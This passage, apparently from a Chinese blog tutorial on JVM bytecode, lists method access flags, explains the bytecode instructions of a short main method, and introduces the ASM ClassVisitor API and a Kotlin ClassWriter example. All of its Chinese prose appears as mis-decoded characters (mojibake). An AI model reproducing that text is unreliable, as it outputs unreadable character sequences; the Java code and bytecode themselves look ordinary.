‡å¿—å€¼</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>ACC_PUBLIC</td><td>0x0001</td><td>æ–¹æ³•æ˜¯å¦ä¸ºpublic</td></tr><tr><td>ACC_PRIVATE</td><td>0x0002</td><td>æ–¹æ³•æ˜¯å¦ä¸ºprivate</td></tr><tr><td>ACC_PROTECTED</td><td>0x0004</td><td>æ–¹æ³•æ˜¯å¦ä¸ºprotected</td></tr><tr><td>ACC_STATIC</td><td>0x0008</td><td>æ–¹æ³•æ˜¯å¦ä¸ºstatic</td></tr><tr><td>ACC_FINAL</td><td>0x0010</td><td>æ–¹æ³•æ˜¯å¦ä¸ºfinal</td></tr><tr><td>ACC_SYNCHRONIZED</td><td>0x0020</td><td>æ–¹æ³•æ˜¯å¦ä¸ºsynchronized</td></tr><tr><td>ACC_BRIDGE</td><td>0x0040</td><td>æ–¹æ³•æ˜¯ä¸æ˜¯ç”±ç¼–è¯‘å™¨äº§ç”Ÿçš„æ¡¥æ¥æ–¹æ³•</td></tr><tr><td>ACC_VARARGS</td><td>0x0080</td><td>æ–¹æ³•æ˜¯å¦æ¥å—ä¸å®šå‚æ•°</td></tr><tr><td>ACC_NATIVE</td><td>0x0100</td><td>æ–¹æ³•æ˜¯å¦ä¸ºnative</td></tr><tr><td>ACC_ABSTRACT</td><td>0x0400</td><td>æ–¹æ³•æ˜¯å¦ä¸ºabstract</td></tr><tr><td>ACC_STRICT</td><td>0x0800</td><td>æ–¹æ³•æ˜¯å¦ä¸ºstrictfp</td></tr><tr><td>ACC_SYNTHETIC</td><td>0x1000</td><td>æ–¹æ³•æ˜¯å¦ç”±ç¼–è¯‘å™¨è‡ªåŠ¨äº§ç”Ÿ</td></tr></tbody></table><h4 id="å­—èŠ‚ç æŒ‡ä»¤"><a href="#å­—èŠ‚ç æŒ‡ä»¤" class="headerlink" title="å­—èŠ‚ç æŒ‡ä»¤"></a>å­—èŠ‚ç æŒ‡ä»¤</h4><blockquote><p>æˆ‘è§‰å¾—å­—èŠ‚ç è¦ç»†è®²å®Œå…¨å¯ä»¥å†å•å¼€ä¸€ç¯‡è®²ï¼Œè¿™é‡Œå°±ç¨å¾®è®²ä¸€ç‚¹åŸºç¡€çš„ï¼Œè®©å¾…ä¼šASMçš„æ—¶å€™ä¸è‡³äºå®Œå…¨æ‡µé€¼å°±è¡Œ</p></blockquote><p>å‰é¢è®²äº†è¿™ä¹ˆå¤šåŸºæœ¬éƒ½æ˜¯æè¿°ç±»å’Œæ–¹æ³•çš„ä¿¡æ¯ï¼Œå¤§å®¶ä¸€å®šå¾ˆå¥½å¥‡æˆ‘ä»¬ç¼–å†™çš„ç¨‹åºé€»è¾‘åˆ°åº•æ”¾åœ¨å“ªé‡Œäº†å§ã€‚æ²¡é”™ï¼Œæˆ‘ä»¬ç¼–å†™çš„é€»è¾‘è¢«ç¼–è¯‘æˆäº†é¢å‘æ“ä½œ<strong>æ“ä½œæ•°æ ˆ</strong>çš„å­—èŠ‚ç æŒ‡ä»¤ã€‚ä¸ºä»€ä¹ˆè¦è¯´å®ƒæ˜¯é¢å‘<strong>æ“ä½œæ•°æ ˆ</strong>çš„æ“ä½œæŒ‡ä»¤ï¼Ÿæ¥ä¸‹æ¥æˆ‘ä¼šè®²ä¸€è®²mainæ–¹æ³•ä¸­æ‰€æœ‰å­—èŠ‚ç æŒ‡ä»¤çš„ä½œç”¨ï¼Œå¬å®Œä½ ä»¬å°±çŸ¥é“äº†ã€‚</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">+</span> a<span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">sum</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>Code:  stack=3, locals=3, args_size=1     0: iconst_1     1: istore_1     2: iconst_2     3: iload_1     4: iadd     5: istore_2     6: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;     9: iload_1    10: iload_2    11: invokestatic  #3                  // Method sum:(II)I    14: invokevirtual #4                  // Method java/io/PrintStream.println:(I)V    17: return</code></pre><hr><blockquote><p>iconst_1</p></blockquote><p>å°†ä¸€ä¸ªintç±»å‹çš„å¸¸é‡<code>1</code>åŠ è½½åˆ°<strong>æ“ä½œæ•°æ ˆ</strong>, æ­¤æ—¶æ“ä½œæ•°æ ˆæ·±åº¦ä¸º1ã€‚å¯¹åº”<code>int a = 1</code>ä¸­1çš„åˆå§‹åŒ–ã€‚</p><blockquote><p>istore_1</p></blockquote><p>å°†ä¸€ä¸ªintç±»å‹çš„æ•°å€¼ä»<strong>æ“ä½œæ•°æ ˆ</strong>é¡¶å–å‡ºå¹¶å­˜å‚¨åˆ°å±€éƒ¨å˜é‡è¡¨ï¼Œè¿™ä¸ªæ•°å€¼åœ¨æ“ä½œæ•°æ ˆçš„ä½ç½®ä¸º1ï¼Œå³æˆ‘ä»¬åˆšæ‰å‹è¿›æ“ä½œæ•°æ ˆçš„<code>1</code>ï¼Œå¯¹åº”<code>int a = 1</code>ä¸­çš„èµ‹å€¼æ“ä½œ</p><blockquote><p>iconst_2</p></blockquote><p>å°†ä¸€ä¸ªintç±»å‹çš„å¸¸é‡<code>2</code>åŠ è½½åˆ°<strong>æ“ä½œæ•°æ ˆ</strong>ï¼Œæ­¤æ—¶æ“ä½œæ•°æ ˆæ·±åº¦ä¸º2ã€‚å¯¹åº” <code>int b = 2 + a</code>ä¸­2çš„åˆå§‹åŒ–</p><blockquote><p>iload_1</p></blockquote><p>å°†ä¸€ä¸ªintç±»å‹çš„å±€éƒ¨å˜é‡ç›´æ¥åŠ è½½åˆ°<strong>æ“ä½œæ•°æ ˆ</strong>ï¼Œè¿™ä¸ªå±€éƒ¨å˜é‡åœ¨å±€éƒ¨å˜é‡è¡¨çš„ä½ç½®ä¸º1ã€‚å³åˆšæ‰ç¬¬äºŒæ¡æŒ‡ä»¤å­˜è¿›å±€éƒ¨å˜é‡è¡¨çš„å±€éƒ¨å˜é‡<code>a</code></p><blockquote><p>iadd</p></blockquote><p>å°†<strong>æ“ä½œæ•°æ ˆ</strong>é¡¶çš„ä¸¤ä¸ªintç±»å‹çš„æ•°å€¼å–å‡ºå¹¶ç›¸åŠ ï¼Œå†å‹è¿›<strong>æ“ä½œæ•°æ ˆ</strong>ä¸­ï¼Œå¯¹åº”<code>int b = 2 + a</code>çš„åŠ æ³•è¿ç®—</p><blockquote><p>istore_2</p></blockquote><p>å°†ä¸€ä¸ªintç±»å‹çš„æ•°å€¼ä»<strong>æ“ä½œæ•°æ ˆ</strong>é¡¶ä¸­å–å‡ºå¹¶å­˜å‚¨åˆ°å±€éƒ¨å˜é‡è¡¨ï¼Œè¿™ä¸ªæ•°å€¼åœ¨<strong>æ“ä½œæ•°æ ˆ</strong>çš„ä½ç½®ä¸º2ï¼Œå¯¹åº”<code>int b = 2 + a</code>çš„èµ‹å€¼</p><blockquote><p>getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;</p></blockquote><p>è·å–é™æ€åŸŸ<code>System.out</code>, ç±»å‹ä¸º<code>Ljava/io/PrintStream</code>,å¹¶å°†å…¶å‹å…¥<strong>æ“ä½œæ•°æ ˆ</strong>é¡¶ã€‚åé¢è·Ÿçš„<code>#2</code>åœ¨å¸¸é‡æ± ä¸­å¯¹åº”<code>Field java/lang/System.out:Ljava/io/PrintStream;</code></p><blockquote><p>iload_1</p></blockquote><p>å°†intç±»å‹çš„å±€éƒ¨å˜é‡<code>a</code>åŠ è½½åˆ°<strong>æ“ä½œæ•°æ ˆ</strong>ï¼Œå¾…ç”¨</p><blockquote><p>iload_2</p></blockquote><p>å°†intç±»å‹çš„å±€éƒ¨å˜é‡båŠ è½½åˆ°<strong>æ“ä½œæ•°æ ˆ</strong>ï¼Œå¾…ç”¨</p><blockquote><p>invokestatic  #3                  // Method sum:(II)I</p></blockquote><p>æ‰§è¡Œæ‰€åœ¨ç±»ä¸­çš„é™æ€æ–¹æ³•ï¼Œä¼ å…¥æ ˆé¡¶çš„ä¸¤ä¸ªintæ•°å€¼ä½œä¸ºå½¢å‚ï¼Œè¿”å›ä¸€ä¸ªintç±»å‹çš„å€¼å‹å…¥æ ˆé¡¶</p><blockquote><p>invokevirtual #4                  // Method java/io/PrintStream.println:(I)V</p></blockquote><p>æ‰§è¡Œ<code>PrintStream#println</code>æ–¹æ³•ï¼Œä¼ å…¥æ ˆé¡¶å…ƒç´ ä½œä¸ºå‚æ•°ï¼Œå†ä¼ å…¥ä¸‹ä¸€ä¸ªæ ˆé¡¶å…ƒç´ ä½œä¸ºreceiverï¼ˆä¸çŸ¥é“javaè¿™ä¸ªå«ä»€ä¹ˆï¼Œåæ­£kotlinæœ‰receiverè¿™ä¸ªæ¦‚å¿µï¼‰</p><blockquote><p>return</p></blockquote><p>è¿”å›void</p><hr><p>ç»è¿‡ä¸Šé¢çš„åˆ†ææˆ‘ä»¬å·²ç»å¤§è‡´çŸ¥é“äº†æŸäº›å­—èŠ‚ç çš„åŠŸèƒ½ï¼Œä½ è‚¯å®šä¹Ÿå‘ç°äº†ï¼Œå¾ˆå¤§ä¸€éƒ¨åˆ†å­—èŠ‚ç çš„åŠŸèƒ½æ˜¯åŸºäº<strong>æ“ä½œæ•°æ ˆ</strong>å®ç°çš„ã€‚</p><p>ç‰¹åˆ«æ˜¯åŸºäºæ ˆçš„æ•°å­¦è¿ç®—ï¼ŒæŒºæœ‰æ„æ€çš„ï¼Œæˆ‘è®°å¾—æˆ‘ä»¬ä¸Šå­¦æœŸæœ‰ä¸€æ¬¡çº¢å²©ä½œä¸šå°±æ˜¯å®ç°ä¸€ä¸ªé€»è¾‘è¿ç®—ï¼Œå½“æ—¶å»ç½‘ä¸Šçœ‹äº†ä¸€ä¸‹ï¼Œè¦ç”¨é€†æ³¢å…°è¡¨è¾¾å¼çš„è§£ææ–¹å¼é…åˆæ ˆæ¥å®ç°ï¼Œè¿™åº”è¯¥ä¹Ÿæ˜¯jvmæ•°å­¦è¿ç®—çš„å®ç°æ–¹å¼å§ï¼Œæœ‰å…´è¶£å¯ä»¥å†å†™ä¸€éã€‚</p><p>è¿™é‡Œæˆ‘å°±ä¸ç³»ç»Ÿæ€§çš„è®²è§£å­—èŠ‚ç æŒ‡ä»¤äº†ï¼Œå¤ªå¤šäº†ï¼Œæ ¹æœ¬è®²ä¸å®Œã€‚ä½†ä½ ä»¬å¯ä»¥è¯¾ä¸‹å»äº†è§£ï¼Œæˆ‘ä¸€èˆ¬æ˜¯é‡è§ä¸è®¤è¯†çš„ç„¶åå†å»æŸ¥:)</p><h3 id="ASMæ¡†æ¶"><a href="#ASMæ¡†æ¶" class="headerlink" title="ASMæ¡†æ¶"></a>ASMæ¡†æ¶</h3><p>å‰é¢æˆ‘ä»¬å­¦ä¹ äº†å­—èŠ‚ç çš„åŸºæœ¬ç»“æ„ä»¥åŠéƒ¨åˆ†å­—èŠ‚ç æŒ‡ä»¤ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨ASM/Javassist/cglibç­‰å­—èŠ‚ç æ“æ§æ¡†æ¶æ¥åŠ¨æ€çš„ä¿®æ”¹/ç”Ÿæˆå­—èŠ‚ç ã€‚é‚£ä¹ˆé€šè¿‡å®ƒä»¬æˆ‘ä»¬èƒ½åšåˆ°ä»€ä¹ˆäº‹æƒ…å‘¢?</p><ul><li>ç¼–è¯‘æœŸä»£ç ç”Ÿæˆ/æ›¿æ¢ ï¼Œä¸€èˆ¬é€šè¿‡gradleæ’ä»¶å¹²é¢„ç¼–è¯‘å®ç°ï¼ˆä¾‹å¦‚è‘—åçš„gradleæ’ä»¶shadowJarçš„ä¾èµ–åŒ…é‡å®šå‘(relocate)åŠŸèƒ½)ã€‚å­—èŠ‚ç æ’æ¡©ä¹Ÿæ˜¯åœ¨è¿™ä¸ªè¿‡ç¨‹è¿›è¡Œã€‚</li><li>è¿è¡ŒæœŸåŠ¨æ€ä»£ç†ï¼Œå¯ä»¥åšåˆ°ä¸€äº›InvocationHandleråšä¸åˆ°çš„äº‹æƒ…ï¼Œä¾‹å¦‚ä¿®æ”¹ç±»ä¸­åŒ…å¼•ç”¨çš„åŒ…åã€‚</li><li>åœ¨è·å–ä¸€äº›ç±»çš„ä¿¡æ¯æ—¶ï¼Œä½¿ç”¨asmè¯»å–å­—èŠ‚ç æ¯”åå°„è¦å¿«å¾—å¤šã€‚</li><li>ä½¿ç”¨jvmä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„ç‰¹æ€§ï¼Œä¾‹å¦‚<a href="https://github.com/MeiVinEight/ReflectionFX">MeiVinEight/ReflectionFX: Reflection Toolkit (github.com)</a>ï¼Œè¯¥é¡¹ç›®åˆ©ç”¨å­—èŠ‚ç çš„ä¸€äº›ä¹±ä¸ƒå…«ç³Ÿçš„ç‰¹æ€§å®ç°äº†æ€§èƒ½å¼€é”€æ›´å°çš„åå°„ï¼Œå…¶æ€§èƒ½ç”šè‡³èƒ½å¤Ÿä¸æ“ä½œMethodHandleæŒå¹³ã€‚</li></ul><p>å…¶å®åº”è¯¥è¿˜æœ‰å¾ˆå¤šï¼Œæˆ‘å°±ä¸åˆ—ä¸¾äº†ã€‚</p><p>è¿™é‡Œå¯èƒ½æœ‰äººæœ‰ç–‘é—®ï¼Œæˆ‘ä»¬androidä¸æ˜¯ç¼–è¯‘æˆdexå—ï¼Œé‚£æŒ‰ç…§å¸¸è§„çš„æ–¹å¼æ“ä½œå­—èŠ‚ç æ˜¯å¯è¡Œçš„å—ï¼Ÿç­”æ¡ˆæ˜¯å¯è¡Œï¼Œå› ä¸ºæˆ‘ä»¬å­—èŠ‚ç æ’æ¡©çš„è¿‡ç¨‹ä¸€èˆ¬æ˜¯</p><p>è¿™é‡Œæˆ‘ä¸»è¦ä»‹ç»asmæ¡†æ¶ï¼Œå®ƒæ˜¯æœ€æµè¡Œï¼Œæœ€ç›´æ¥çš„æ“ä½œå­—èŠ‚ç çš„æ¡†æ¶ï¼Œjdkç”šè‡³å†…ç½®äº†ä¸€ä»½ã€‚å¦‚æœä»å­¦ä¹ å­—èŠ‚ç çš„è§’åº¦æ¥çœ‹ï¼Œasmæ— ç–‘æ˜¯æœ€åˆé€‚çš„é€‰æ‹©ã€‚åŒæ—¶å®‰å“ä¸­ç”¨å¾—æ¯”è¾ƒå¤šçš„æŠ€æœ¯å°±æ˜¯å­—èŠ‚ç æ’æ¡©ï¼Œæ‰€ä»¥æˆ‘å‡†å¤‡è®²ä¸€è®²å¦‚ä½•ç”¨asmæ¡†æ¶å®ç°å­—èŠ‚ç æ’æ¡©ã€‚</p><h4 id="ASM-Core-API-amp-Tree-API"><a href="#ASM-Core-API-amp-Tree-API" class="headerlink" title="ASM Core API &amp; Tree API"></a>ASM Core API &amp; Tree API</h4><h5 id="Core-API"><a href="#Core-API" class="headerlink" title="Core API"></a>Core API</h5><p>ASM æ˜¯åŸºäºè®¿é—®è€…æ¨¡å¼è®¾è®¡çš„ï¼Œè®¿é—®è€…æ¨¡å¼å¯ä»¥è®©ASMæ›´å¥½çš„æ“ä½œæŸä¸ªJaråŒ…/classæ–‡ä»¶ä¸­çš„æ‰€æœ‰ç±»/å­—æ®µ/æ–¹æ³•ã€‚å› æ­¤è¦å­¦ä¼šASMï¼Œé¦–å…ˆå¿…é¡»è¦äº†è§£è®¿é—®è€…æ¨¡å¼ã€‚(æˆ‘å…¶å®æ‡µé€¼äº†å¾ˆä¹…) å¦‚æœä½ ä»¬ä»¥åæœ‰å…´è¶£äº†è§£kapt/kspä¹Ÿä¼šç”¨åˆ°è®¿é—®è€…æ¨¡å¼ã€‚ï¼ˆå®é™…ä¸Šè¿™ä¿©å¾ˆå¤šæ—¶å€™æ˜¯è·Ÿasmé…åˆç€ç”¨çš„, kapt/kspç”Ÿæˆä»£ç ï¼Œasmå¯¹ä»£ç è¿›è¡Œæ’æ¡©è°ƒç”¨ï¼‰</p><p><a href="https://www.runoob.com/design-pattern/visitor-pattern.html">è®¿é—®è€…æ¨¡å¼ | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a></p><p>ç°åœ¨æˆ‘ä»¬æ¥è®²è®²åŸºç¡€ç”¨æ³•:</p><p>ASMåŸºäºè®¿é—®è€…æ¨¡å¼ï¼Œä¸ºæˆ‘ä»¬æä¾›äº†ä¸€å¥—è®¿é—®classæ–‡ä»¶ä¸­æ‰€æœ‰å±æ€§çš„APIã€‚</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">ClassVisitor</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">visit</span><span class="token punctuation">(</span><span class="token keyword">int</span> version<span class="token punctuation">,</span> <span class="token keyword">int</span> access<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">String</span> signature<span class="token punctuation">,</span> <span class="token class-name">String</span> superName<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> interfaces<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//è®¿é—®ç±»å­—æ®µæ—¶å›è°ƒ</span>    <span class="token keyword">public</span> <span class="token class-name">FieldVisitor</span> <span class="token function">visitField</span><span class="token punctuation">(</span><span class="token keyword">int</span> access<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">String</span> desc<span class="token punctuation">,</span> <span class="token class-name">String</span> signature<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//è®¿é—®ç±»æ–¹æ³•æ˜¯å›è°ƒ</span>    <span class="token keyword">public</span> <span class="token class-name">MethodVisitor</span> <span class="token function">visitMethod</span><span class="token punctuation">(</span><span class="token keyword">int</span> access<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">String</span> desc<span class="token punctuation">,</span> <span class="token class-name">String</span> signature<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> exceptions<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">visitEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ä½¿ç”¨ClassVisitorè®¿é—®ç±»æ—¶ï¼Œä¸€æ—¦è®¿é—®åˆ°å…¶ä¸­çš„å±æ€§å°±ä¼šå›è°ƒåˆ°å¯¹åº”çš„å±æ€§çš„è®¿é—®æ–¹æ³•ã€‚</p><blockquote><h6 id="1ï¼švoid-visit-int-version-int-access-String-name-String-signature-String-superName-String-interfaces"><a href="#1ï¼švoid-visit-int-version-int-access-String-name-String-signature-String-superName-String-interfaces" class="headerlink" title="1ï¼švoid visit(int version, int access, String name, String signature, String superName, String[] interfaces)"></a>1ï¼švoid visit(int version, int access, String name, String signature, String superName, String[] interfaces)</h6><p>è®¿é—®classçš„å¤´ä¿¡æ¯</p><p>versionï¼šclassç‰ˆæœ¬ï¼ˆç¼–è¯‘çº§åˆ«ï¼‰</p><p>accessï¼š è®¿é—®æ ‡ç¤º</p><p>nameï¼šç±»åç§°</p><p>signatureï¼šclassçš„ç­¾åï¼Œå¯èƒ½æ˜¯null</p><p>superNameï¼šè¶…ç±»åç§°</p><p>interfacesï¼šæ¥å£çš„åç§°</p><h6 id="2ï¼švoid-visitAnnotation-String-descriptor-boolean-visible"><a href="#2ï¼švoid-visitAnnotation-String-descriptor-boolean-visible" class="headerlink" title="2ï¼švoid visitAnnotation(String descriptor, boolean visible)"></a>2ï¼švoid visitAnnotation(String descriptor, boolean visible)</h6><p>è®¿é—®classçš„æ³¨è§£ä¿¡æ¯</p><p>descriptorï¼šæè¿°ä¿¡æ¯</p><p>visibleï¼šæ˜¯å¦è¿è¡Œæ—¶å¯è§</p><h6 id="3ï¼šFieldVisitor-visitField-int-access-String-name-String-descriptor-String-signature-Object-value"><a href="#3ï¼šFieldVisitor-visitField-int-access-String-name-String-descriptor-String-signature-Object-value" class="headerlink" title="3ï¼šFieldVisitor visitField(int access, String name,String descriptor, String signature,Object value)"></a>3ï¼šFieldVisitor visitField(int access, String name,String descriptor, String signature,Object value)</h6><p>è®¿é—®classä¸­å­—æ®µçš„ä¿¡æ¯ï¼Œè¿”å›ä¸€ä¸ªFieldVisitorç”¨äºè·å–å­—æ®µä¸­æ›´åŠ è¯¦ç»†çš„ä¿¡æ¯ã€‚</p><p>nameï¼šå­—æ®µä¸ªçš„åç§°</p><p>descriptorï¼šå­—æ®µçš„æè¿°</p><p>valueï¼šè¯¥å­—æ®µçš„åˆå§‹å€¼ï¼Œæ–‡æ¡£ä¸Šé¢è¯´ï¼š</p><p>è¯¥å‚æ•°ï¼Œå…¶å¯ä»¥æ˜¯é›¶ï¼Œå¦‚æœå­—æ®µä¸å…·æœ‰åˆå§‹å€¼ï¼Œå¿…é¡»æ˜¯ä¸€ä¸ª<code>Integer</code>ï¼Œä¸€<code>Float</code>ï¼Œä¸€<code>Long</code>ï¼Œä¸€ä¸ª<code>Double</code>æˆ–ä¸€ä¸ª<code>String</code>ï¼ˆå¯¹äº<code>int</code>ï¼Œ<code>float</code>ï¼Œ<code>long</code> æˆ–<code>String</code>åˆ†åˆ«å­—æ®µï¼‰ã€‚<em>æ­¤å‚æ•°ä»…ç”¨äºé™æ€å­—æ®µ</em>ã€‚å¯¹äºéé™æ€å­—æ®µï¼Œå®ƒçš„å€¼è¢«å¿½ç•¥ï¼Œéé™æ€å­—æ®µå¿…é¡»é€šè¿‡æ„é€ å‡½æ•°æˆ–æ–¹æ³•ä¸­çš„å­—èŠ‚ç æŒ‡ä»¤è¿›è¡Œåˆå§‹åŒ–ï¼ˆä½†æ˜¯ä¸ç®¡æˆ‘æ€ä¹ˆè¯•ï¼Œç»“æœéƒ½æ˜¯nullï¼‰ã€‚</p><h6 id="4ï¼šMethodVisitor-visitMethod-int-access-String-name-String-descriptor-String-signature-String-exceptions"><a href="#4ï¼šMethodVisitor-visitMethod-int-access-String-name-String-descriptor-String-signature-String-exceptions" class="headerlink" title="4ï¼šMethodVisitor visitMethod(int access,String name,String descriptor,String signature, String[] exceptions)"></a>4ï¼šMethodVisitor visitMethod(int access,String name,String descriptor,String signature, String[] exceptions)</h6><p>è®¿é—®classä¸­æ–¹æ³•çš„ä¿¡æ¯ï¼Œè¿”å›ä¸€ä¸ªMethodVisitorç”¨äºè·å–æ–¹æ³•ä¸­æ›´åŠ è¯¦ç»†çš„ä¿¡æ¯ã€‚</p><p>nameï¼šæ–¹æ³•çš„åç§°</p><p>descriptorï¼šæ–¹æ³•çš„æè¿°</p><p>signatureï¼šæ–¹æ³•çš„ç­¾å</p><p>exceptionsï¼šæ–¹æ³•çš„å¼‚å¸¸åç§°</p><h6 id="5ï¼švisitInnerClass-String-name-String-outerName-String-innerName-int-access"><a href="#5ï¼švisitInnerClass-String-name-String-outerName-String-innerName-int-access" class="headerlink" title="5ï¼švisitInnerClass(String name, String outerName, String innerName, int access)"></a>5ï¼švisitInnerClass(String name, String outerName, String innerName, int access)</h6><p>è®¿é—®classä¸­å†…éƒ¨ç±»çš„ä¿¡æ¯ã€‚è¿™ä¸ªå†…éƒ¨ç±»ä¸ä¸€å®šæ˜¯è¢«è®¿é—®ç±»çš„æˆå‘˜ï¼ˆè¿™é‡Œçš„æ„æ€æ˜¯å¯èƒ½æ˜¯ä¸€æ®µæ–¹æ³•ä¸­çš„<strong>åŒ¿åå†…éƒ¨ç±»</strong>ï¼Œæˆ–è€…<strong>å£°æ˜åœ¨ä¸€ä¸ªæ–¹æ³•ä¸­çš„ç±»</strong>ç­‰ç­‰ï¼‰ã€‚</p><p>nameï¼šå†…éƒ¨ç±»çš„åç§°ã€‚ä¾‹å­<code>com/hebaibai/example/demo/Aoo$1XX</code></p><p>outerNameï¼šå†…éƒ¨ç±»æ‰€åœ¨ç±»çš„åç§°</p><p>innerNameï¼šå†…éƒ¨ç±»çš„åç§°</p><h6 id="6ï¼švisitOuterClass-String-owner-String-name-String-descriptor"><a href="#6ï¼švisitOuterClass-String-owner-String-name-String-descriptor" class="headerlink" title="6ï¼švisitOuterClass(String owner, String name, String descriptor)"></a>6ï¼švisitOuterClass(String owner, String name, String descriptor)</h6><p>è®¿é—®è¯¥ç±»çš„å°é—­ç±»ã€‚ä»…å½“ç±»å…·æœ‰å°é—­ç±»æ—¶ï¼Œæ‰å¿…é¡»è°ƒç”¨æ­¤æ–¹æ³•ã€‚</p><p>æˆ‘è‡ªå·±è¯•äº†ä¸€ä¸‹ï¼Œå¦‚æœåœ¨ä¸€ä¸ªæ–¹æ³•ä¸­å®šä¹‰äº†ä¸€ä¸ªclassï¼Œæˆ–è€…å®šä¹‰ä¸ªä¸€ä¸ªåŒ¿åå†…éƒ¨ç±»ï¼Œè¿™æ—¶é€šè¿‡visitInnerClassæ–¹æ³•èƒ½å¤Ÿå¾—åˆ°ä¾‹å¦‚<code>com/hebaibai/example/demo/Aoo$1</code>æˆ–è€…<code>com/hebaibai/example/demo/Aoo$1XX</code>çš„ç±»åç§°ã€‚è¿™æ—¶é€šè¿‡ä½¿ç”¨</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">ClassReader classReader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassReader</span><span class="token punctuation">(</span><span class="token string">"com/hebaibai/example/demo/Aoo$1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> classReader<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">DemoClassVisitor</span><span class="token punctuation">(</span>Opcodes<span class="token punctuation">.</span><span class="token constant">ASM7</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ClassReader<span class="token punctuation">.</span><span class="token constant">SKIP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¤åˆ¶</p><p>å¯ä»¥å¾—åˆ°æŒæœ‰å†…éƒ¨ç±»çš„ç±»ä¿¡æ¯ã€‚</p><p>ownerï¼šæ‹¥æœ‰è¯¥ç±»çš„classåç§°</p><p>nameï¼šåŒ…å«è¯¥ç±»çš„æ–¹æ³•çš„åç§°ï¼Œå¦‚æœè¯¥ç±»æœªåŒ…å«åœ¨å…¶å°é—­ç±»çš„æ–¹æ³•ä¸­ï¼Œåˆ™è¿”å›null</p><p>descriptorï¼šæè¿°</p></blockquote><p>ClassVisitoræ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç»§æ‰¿å®ƒæ¥å®ç°è‡ªå·±çš„ClassVisitorï¼ˆMethodVistitor/FieldVisitoråŒ)ã€‚æˆ‘ä»¬å¯ä»¥æ’å…¥ä¸€æ®µé€»è¾‘æ¥è·å–æˆ‘ä»¬è¦è®¿é—®çš„ç±»çš„ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ”¹å˜æ–¹æ³•çš„è¿”å›å€¼æ¥ä¿®æ”¹ç±»çš„ä¿¡æ¯ã€‚</p><p>å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡ClassWriteræ¥ç”Ÿæˆä¸€ä¸ªç±»ï¼Œæ‰‹åŠ¨è°ƒç”¨å®ƒçš„å„ç§visitæ–¹æ³•æ¥å‘ç”Ÿæˆçš„ç±»æ¥å†™å…¥å­—èŠ‚ç ï¼Œä¸‹é¢æˆ‘ä»¬å…ˆç®€ç®€å•å•å†™ä¸ªHelloWorldã€‚</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">fun</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">val</span> classWriter <span class="token operator">=</span> <span class="token function">ClassWriter</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    classWriter<span class="token punctuation">.</span><span class="token function">visit</span><span class="token punctuation">(</span>        V1_8<span class="token punctuation">,</span>        ACC_PUBLIC <span class="token operator">+</span> ACC_SUPER<span class="token punctuation">,</span>        <span class="token string">"org/example/asmlearn/ASMLearn_Test"</span><span class="token punctuation">,</span>        <span class="token keyword">null</span><span class="token punctuation">,</span>        <span class="token string">"java/lang/Object"</span><span class="token punctuation">,</span>        <span class="token keyword">null</span>    <span class="token punctuation">)</span>    <span class="token keyword">val</span> mv <span class="token 